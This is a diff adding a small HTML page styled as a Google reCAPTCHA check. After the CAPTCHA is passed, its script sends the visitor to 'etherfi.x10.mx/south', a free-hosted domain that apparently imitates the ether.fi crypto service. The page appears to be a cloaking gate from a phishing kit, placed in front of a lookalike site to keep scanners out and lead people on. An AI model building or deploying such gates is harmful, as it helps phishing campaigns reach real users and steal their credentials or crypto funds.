@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google reCAPTCHA Verification</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            background: #007bff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Please verify you are human</h2>
+        <form id="captcha-form" action="#" onsubmit="return validateCaptcha(event)">
+            <div class="g-recaptcha" data-sitekey="6Lex7fEqAAAAAE2T_PvXSWFNElsPzRXzozqdo92Q"></div>
+            <br>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        function validateCaptcha(event) {
+            event.preventDefault();
+            var response = grecaptcha.getResponse();
+            if (response.length === 0) {
+                alert("Please complete the CAPTCHA!");
+            } else {
+                window.location.href = "https://etherfi.x10.mx/south"; // Redirect after successful verification
+            }
+        }
+    </script>
+
+</body>
+</html>
